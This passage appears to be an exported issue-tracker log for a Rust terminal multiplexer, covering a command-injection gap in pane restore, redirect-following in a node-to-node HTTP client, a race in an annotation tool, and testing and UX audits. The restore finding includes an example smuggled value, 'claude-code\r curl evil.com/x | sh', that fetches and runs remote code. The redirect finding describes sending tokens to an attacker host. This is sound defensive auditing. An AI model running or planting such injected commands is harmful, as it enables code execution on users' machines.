      command: &str,          // <- from RestoredPaneState.command
      cwd: &Path,
      agent_type: &str,
  ) -> Result<(), String> {
      let cd_cmd = format!("cd {}\r", shell_escape(cwd));
      self.wezterm.send_text(pane_id, &cd_cmd).await...;
      ...
      let full_cmd = format!("{command}\r");   // <- unsanitized
      self.wezterm.send_text(pane_id, &full_cmd).await...;
  ```
- crates/frankenterm-core/src/restore_process.rs:648 — the cx-first
  variant has the same shape and the same gap.
- Note the asymmetry: `cwd` IS passed through `shell_escape(cwd)`,
  but `command` is not. The cd helper got the defensive treatment;
  the main command did not.

## Impact / trust boundary
`RestoredPaneState.command` is loaded from the SQLite session DB
at `session_restore.rs:892` where `state.command` is read from the
`mux_pane_state` table. Attack paths requiring this field to be
attacker-controlled:

1. DB write access (already implies full-user compromise; out of
   scope as a net-new threat).
2. Snapshot bundle import from an untrusted source — `ft diag
   bundle` round-trips include session data; if someone shares a
   diag bundle and it gets restored, the imported `command`
   values pass through this path.
3. `ft restart --launch-agents` applied after a targeted
   corruption of `mux_pane_state` rows.

Severity: MEDIUM. Not a remote zero-click — requires an existing
trust-boundary crossing — but the defense-in-depth gap is concrete:
a restored `command` like `claude-code\r curl evil.com/x | sh`
would execute the second line in the user's shell on
`ft restart --launch-agents`.

## Fix direction
1. Quick (defense in depth): reject or strip any `\r`/`\n` from
   `command` before formatting. A restored command that needs
   multi-line input is already broken — the typing model assumes
   one command per restore. Concretely:
   ```rust
   if command.chars().any(|c| matches!(c, '\r' | '\n')) {
       return Err(format!(
           "refusing to launch pane {pane_id}: restored command contains CR/LF"
       ));
   }
   ```
2. Proper (larger): route relaunch through `wezterm cli spawn --`
   with argv-isolated arguments instead of typing into an
   interactive shell. Eliminates shell metacharacter concerns
   entirely.

## Non-gaps verified in the same pass
- Snapshot restore has NO direct `fs::write` / `fs::create_dir`
  path (grep confirmed zero hits in session_restore.rs +
  snapshot_engine.rs). Arbitrary-file-write via restore is not
  reachable today.
- Pattern-pack URL loading: `load_pack_from_id` at patterns.rs:963
  accepts only `builtin:` and `file:` schemes; any other scheme
  returns `PackNotFound`. No HTTP/URL fetch surface. **No SSRF.**
- FTS5 query escaping: user query passes to `MATCH ?1` as a bound
  rusqlite parameter at storage.rs:17486/17496; SQL injection is
  impossible and `validate_fts_query` rejects malformed FTS5 DSL
  cleanly. **Clean.**

## Related
- ft-security-mcp-path-traversal (fixed 30988e53) — same class of
  defense-in-depth gap across the MCP tool surface.
- ft-xv561 (fixed 070117a0) — ReDoS via user-pack regexes.

Added sanitize_restored_command() helper in restore_process.rs that rejects \r/\n/ESC/other C0 controls.  {"id":"ft-kfkyi","title":"DistributedHttpClient must not transparently follow 3xx redirects","description":"# Security: DistributedHttpClient transparent redirect following

## Background
Discovered during ft-xbnl0.2.4 tick 349 verification work. `DistributedHttpClient`
(built on the default asupersync HTTP client config) **follows 3xx redirects
transparently** by default. A 302 with an arbitrary `Location:` header is
followed without caller visibility.

Current behavior is pinned by `distributed_http_client_3xx_redirect_current_behavior_snapshot`
in `crates/frankenterm-core/src/distributed.rs` (tests module) — the test
asserts `Err` on a 302 whose Location is unresolvable, and explicitly
documents that assertion flipping is the trigger for this bead's work.

## Security concern
`DistributedHttpClient` is used for distributed node-to-node RPC (health
checks, event forwarding). Peer URLs are supposed to point at trusted
nodes. Transparent redirect following means:

- A compromised peer can respond `302 Location: http://attacker.com/` →
  next request body is sent to attacker (including event data, pane
  captures, auth tokens).
- Even without compromise, a misconfigured peer with a redirect loop
  could cause unbounded work.

## Fix
Configure `RedirectPolicy::none()` at the `DistributedHttpClient`
construction site — see `crates/frankenterm-core/src/distributed.rs`
around `DistributedHttpClient::new()` and `DistributedHttpClient::plaintext()`.

This forces the caller to explicitly handle (or ignore) the redirect.

## Verification
After the fix:
1. `distributed_http_client_3xx_redirect_current_behavior_snapshot` will
   fail — update it to assert `resp.status == 302` and rename to drop
   the "current-behavior-snapshot" suffix. Rename to
   `distributed_http_client_returns_3xx_redirect_as_ok_response`.
2. Add a second test asserting that a 302 → a different internal host
   is ALSO observable (not followed) — use a second TcpListener in
   the test so the "Location" resolves but the client still doesn't
   follow it.

## Out of scope
- Building a full redirect-following mechanism (if callers want redirects,
  they can opt in explicitly by following the Location themselves after
  inspecting it).
- The asupersync HTTP client's default RedirectPolicy — that's a library
  default and changing it would affect every other caller. The fix is
  to override at the FrankenTerm distributed-client construction site.

## References
- Finding tick: ft-xbnl0.2.4 tick 349 (commit 4013f6e9)
- Related doc: docs/ft-xbnl0-2-4-completion-evidence.md §5 (out of scope carve-out)","status":"closed","priority":2,"issue_type":"task","assignee":"jemanuel","created_at":"2026-04-18T16:59:46.872931Z","created_by":"jemanuel","updated_at":"2026-04-18T17:08:05.852811Z","closed_at":"2026-04-18T17:08:05.852502Z","close_reason":"Completed by tick 351 (commit 4717c434): DistributedHttpClient::new() now constructs via builder with .no_redirects() explicitly. 3xx responses are Ok(Response{status: 3xx}) observable to caller.  {"id":"ft-xgs7n","title":"[testing-fuzzing] pin extract_delta overlap-existence invariant: previous.ends_with(current[..len-delta.len()])","description":"# Gap

proptest_ingest_extract_delta_fuzz.rs covers 5 MRs (crash-freedom,
identity, content-suffix, pure-append, determinism) + 2 inline
regression tests, but does NOT pin the primary semantic contract of
the algorithm: **when Content(delta) is returned, the non-delta head
of `current` must be a tail of `previous`**. Formally:

    extract_delta(previous, current, _) = Content(delta)
    ⇒ previous.ends_with(&current[..current.len() - delta.len()])

This is the invariant the sliding-window search ACTUALLY proves
(search_window[pos..] == current[..overlap_len], where
search_window = previous[search_start..], so previous ends with
current[..overlap_len]). Without it, the algorithm could return a
Content(delta) where the "non-delta prefix" is pure fabrication —
the existing MR3 suffix-check proves current ends with delta but
says nothing about the overlap being real.

Adding this test catches any regression in the overlap-candidate
acceptance logic (`search_window[pos..] == current[..overlap_len]`
on ingest.rs:1711) that accidentally accepts a non-matching window.

Fix: new proptest in proptest_ingest_extract_delta_fuzz.rs covering
every path (pure-append fast path + sliding-window search).","status":"closed","priority":2,"issue_type":"feature","created_at":"2026-04-22T10:04:40.819353Z","created_by":"pane3-ingest-mr","updated_at":"2026-04-22T10:13:32.759851Z","closed_at":"2026-04-22T10:13:32.759521Z","close_reason":"Landed in 5eb9f956 (fix(apc, backpressure, ingest): …, overlap-existence proptest) — extract_delta_content_overlap_exists_in_previous added to tests/proptest_ingest_extract_delta_fuzz.rs:207. Verified: 1 passed / 0 failed / 14 filtered out on --test proptest_ingest_extract_delta_fuzz (test run took 0.20s under 512 proptest cases). Pins the semantic contract that when Content(delta) returns, previous.ends_with(current[..current.len() - delta.len()]) — the 'overlap was real' claim that MR3's suffix-only check does not catch.","source_repo":".","compaction_level":0,"original_size":0,"labels":["ingest","proptest","testing"]}

-{"id":"ft-xkpy1","title":"[ux][P3] Robot + MCP error-hint audit follow-up (beyond MCP_ERR_POLICY)","description":"## Context

/ux-audit sweep of robot + MCP surfaces. Primary finding closed as a trivial ship: all 7 MCP_ERR_POLICY deny sites in mcp_tools.rs (6 McpToolError::new sites + 1 McpEnvelope in the mcp_authorize_mcp_mutation gate helper) previously passed None as hint — leaving MCP clients with 'Read denied by policy' and nowhere to go. Now all seven route through a shared POLICY_DENY_HINT const naming two actionable recovery paths (config.safety.rules for operator review, policy_denied_audit table for decision context).

Secondary findings not in that ship, each worth a separate pass:

## 1. Robot error-code coverage drift vs README

Defined in crates/frankenterm/src/main.rs:4549-4564:
  robot.invalid_args, robot.unknown_subcommand, robot.config_error,
  robot.fts_query_error, robot.approval_error, robot.pane_not_found,
  robot.reservation_conflict, robot.storage_error, robot.feature_not_available,
  robot.policy_denied, robot.timeout, robot.workflow_aborted,
  robot.workflow_error, robot.workflow_not_found, robot.not_implemented,
  robot.remote_text_unavailable

README.md §Error Handling (robot mode) lists robot.wezterm_not_running and robot.require_approval — neither is a defined ROBOT_ERR_* constant. Either the README is stale (likely) or those codes exist under a different name (possible). Audit the README table against the actual constants + per-subcommand emission paths, update whichever is drifted.

## 2. Robot-mode hint uniformity

Walk every  construction in main.rs. MCP_ERR_POLICY just got treated; robot.pane_not_found, robot.timeout, robot.feature_not_available, etc. may have similar 'no-hint' patterns. Check each, add actionable hints matching the /ux-audit test: 'say what to do, not just what went wrong.'

## 3. Format-flag claims (toon vs json)

README claims  saves '40-60% fewer tokens' for AI-to-AI use. Spot-verify: render a few representative envelopes in both formats, measure actual byte counts, confirm the claim holds within some band. If TOON is actually ~15% smaller on small envelopes, the marketing text should be tightened.

## 4. Success-response conciseness

Every MCP tool envelope carries mcp_version, version, ok, data, elapsed_ms, now — 6 top-level keys. For small data payloads (e.g. a 2-item events list) the envelope can be 3-4x the size of the actual data. Consider whether any of mcp_version / version / now are redundant for the client once an initialize handshake has happened; file a separate architectural bead if so.

## Acceptance Criteria per item

- Item 1: README drift closed (either codes renamed in docs, or missing constants added in main.rs), with an assertion test that every documented code exists as a const.
- Item 2: Every robot-mode error construction reviewed; at least one shared const (like POLICY_DENY_HINT) for recurring hint families.
- Item 3: Measurement + either README update or TOON serializer improvement if claim is wrong.
- Item 4: Design doc; no code change until the redundancy is confirmed.

 {"id":"ft-xo3u4","title":"[review][MEDIUM] ft-djpi3 wa.events_annotate changed-bit derivation is TOCTOU-racy across concurrent annotate calls","description":"commit 0a865e6f derives wa.events_annotate's 'changed' field by READ-WRITE-READ-DIFF across four independent storage calls with NO surrounding transaction at crates/frankenterm-core/src/mcp_tools.rs:4292-4368:

    let prior_annotations = storage.get_event_annotations(params.event_id).await?...;   // TXN 1 (read)
    let prior_note = prior_annotations.note.clone();
    storage.set_event_note(params.event_id, params.note.clone(), params.by.clone()).await?;   // TXN 2 (write)
    ... record audit ...                                                                 // TXN 3 (write)
    let annotations = storage.get_event_annotations(params.event_id).await?...;          // TXN 4 (read)
    let changed = prior_note != annotations.note;

Two concurrent wa.events_annotate calls (same event_id, different notes) race:

    Client A: TXN 1 reads prior=None
    Client B: TXN 1 reads prior=None    <-- same pre-state
    Client A: TXN 2 writes 'foo'
    Client B: TXN 2 writes 'bar'        <-- B overwrites A
    Client A: TXN 4 reads note='bar'    <-- A sees B's write, NOT its own
    Client A: changed = None != Some('bar') = TRUE   <-- A claims success despite being overwritten
    Client B: TXN 4 reads note='bar'
    Client B: changed = None != Some('bar') = TRUE

Client A's envelope reports changed=true AND annotations.note='bar' — but A wrote 'foo'. An agent reading the envelope would conclude 'my annotation is live' when it isn't. For multi-agent swarms that use wa.events_annotate to leave a handoff trace on events, this is silent data loss.

The first-event-no-prior case is handled correctly (changed=true for a first write that transitions None→Some; changed=false for clear-on-already-empty) — tests events_annotate_reports_changed_for_real_write_and_noop_rewrite and events_annotate_reports_changed_false_when_clearing_absent_note at :5276-5336 cover the serial case.

## Fix direction

Option A (smallest diff): wrap the read-write-read sequence in a single SQLite transaction so the prior/new reads are consistent with this call's write.

Option B: have set_event_note return (prior_note, new_note) atomically from within its own UPDATE statement (e.g., RETURNING clause + snapshot); compute changed from the return value, no second read needed.

Option C: make the 'changed' semantics 'the write landed and differed from THIS CALL's observation of prior state' — document that concurrent callers may both see changed=true. Weaker contract but simpler.

## Why MEDIUM, not HIGH

- wa.events_annotate concurrency pressure in current deployments is low (annotation is an operator action, not a high-rate path).
- Data loss is bounded (last-write-wins, standard SQLite semantics); the misleading 'changed' bit is reporting-level only.
- Not a ship-blocker; a Linear-FIXME-style follow-up.

Severity: MEDIUM. Audit round 15, 2026-04-23. Stops the specific silent-data-loss pathology the bead cited: Client A will no longer emit `changed: true, annotations.note: <B's value>` as if A's write succeeded. annotations in the envelope still reflects authoritative on-disk state, so a client noticing `annotations.note != params.note` can explicitly detect the last-write-wins race. Option B (set_event_note returning prior atomically via a surrounding transaction) is left as a deeper follow-up — ripples into WriteCommand + the sync helper signature. Existing serial tests at mcp_tools.rs:5336-5398 continue to hold (None→Some=true, Some→Some=false, None→None=false all derive identically under the new rule).
